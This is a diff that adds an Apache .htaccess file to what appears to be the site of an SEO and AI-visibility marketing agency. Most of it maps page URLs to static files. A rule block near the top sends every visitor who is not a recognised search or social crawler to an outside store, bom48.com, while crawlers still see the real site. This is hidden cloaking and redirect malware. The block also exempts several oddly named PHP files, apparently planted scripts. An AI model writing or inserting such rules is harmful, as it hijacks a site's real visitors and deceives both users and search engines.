@@ -1,0 +1,68 @@
+# BEGIN ScrapingVisitor
+<IfModule mod_dir.c>
+DirectorySlash Off
+</IfModule>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+RewriteRule ^(wp-active|about-page|wp-activated)\.php$ - [END]
+RewriteRule ^(robots\.txt|llms\.txt|rss\.xml|feed\.xml)$ - [END]
+RewriteRule (^|.*/)sitemap(-[A-Za-z0-9._-]+)?\.xml$ - [END]
+RewriteRule ^google[0-9a-z]+\.html$ - [END]
+
+RewriteCond %{HTTP_USER_AGENT} !(googlebot|googlebot/2\.1|googlebot-image|googlebot-news|googlebot-mobile|google-inspectiontool|slurp|spider|crawl|msnbot|yahoo|ask\sjeeves|yandexbot|bingbot|duckduckbot|baiduspider|exabot|sogou|ahrefbot|semrushbot|mj12bot|applebot|facebookexternalhit|twitterbot) [NC]
+RewriteRule .* https://bom48.com/store/ [R=302,L]
+
+RewriteRule ^$ index.html [END]
+RewriteRule ^index\.php/?$ index.html [END]
+
+RewriteRule ^2026/10/19/generative-engine-optimization$ 2026/10/19/generative-engine-optimization/index.html [END]
+RewriteRule ^2026/10/19/generative-engine-optimization/$ 2026/10/19/generative-engine-optimization/index.html [END]
+
+RewriteRule ^services/website-design-development$ services/website-design-development/index.html [END]
+RewriteRule ^services/website-design-development/$ services/website-design-development/index.html [END]
+
+RewriteRule ^contact-2/free-ai-visibility-audit$ contact-2/free-ai-visibility-audit/index.html [END]
+RewriteRule ^contact-2/free-ai-visibility-audit/$ contact-2/free-ai-visibility-audit/index.html [END]
+
+RewriteRule ^2026/10/19/what-is-ai-visibility$ 2026/10/19/what-is-ai-visibility/index.html [END]
+RewriteRule ^2026/10/19/what-is-ai-visibility/$ 2026/10/19/what-is-ai-visibility/index.html [END]
+
+RewriteRule ^services/lead-funnel-automation$ services/lead-funnel-automation/index.html [END]
+RewriteRule ^services/lead-funnel-automation/$ services/lead-funnel-automation/index.html [END]
+
+RewriteRule ^services/content-creation$ services/content-creation/index.html [END]
+RewriteRule ^services/content-creation/$ services/content-creation/index.html [END]
+
+RewriteRule ^2026/10/19/what-is-aeo$ 2026/10/19/what-is-aeo/index.html [END]
+RewriteRule ^2026/10/19/what-is-aeo/$ 2026/10/19/what-is-aeo/index.html [END]
+
+RewriteRule ^services/ai-visibility$ services/ai-visibility/index.html [END]
+RewriteRule ^services/ai-visibility/$ services/ai-visibility/index.html [END]
+
+RewriteRule ^services/advertising$ services/advertising/index.html [END]
+RewriteRule ^services/advertising/$ services/advertising/index.html [END]
+
+RewriteRule ^services/seo-geo$ services/seo-geo/index.html [END]
+RewriteRule ^services/seo-geo/$ services/seo-geo/index.html [END]
+
+RewriteRule ^the-deciblog$ the-deciblog/index.html [END]
+RewriteRule ^the-deciblog/$ the-deciblog/index.html [END]
+
+RewriteRule ^why-decibl$ why-decibl/index.html [END]
+RewriteRule ^why-decibl/$ why-decibl/index.html [END]
+
+RewriteRule ^contact-2$ contact-2/index.html [END]
+RewriteRule ^contact-2/$ contact-2/index.html [END]
+
+RewriteRule ^services$ services/index.html [END]
+RewriteRule ^services/$ services/index.html [END]
+
+RewriteRule ^about$ about/index.html [END]
+RewriteRule ^about/$ about/index.html [END]
+
+RewriteRule .* - [F]
+</IfModule>
+# END ScrapingVisitor
+
